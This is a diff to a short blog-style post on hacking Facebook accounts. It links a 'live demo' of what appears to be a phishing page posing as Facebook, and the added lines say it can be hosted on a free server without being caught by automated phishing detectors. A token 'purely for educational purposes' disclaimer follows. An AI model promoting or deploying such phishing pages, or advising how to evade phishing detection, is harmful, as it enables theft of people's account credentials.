@@ -6,4 +6,10 @@ There are many ways to hack facebook accounts, but unfortunately, Everything won
 
 Here is it. 
 
-Live <strong>demo</strong>:: <a href="http://iphonexfree.herobo.com/">Facebook Page</a>
+Live <strong>demo</strong>:: <a href="http://iphonexfree.herobo.com/" target="_blank">Facebook Page</a>
+
+<br>
+
+You can host this on a free server, and it does not get traced down by the automated phishing page detector :)
+
+This is purely for the educational purposes and is not intended to hurt anyone
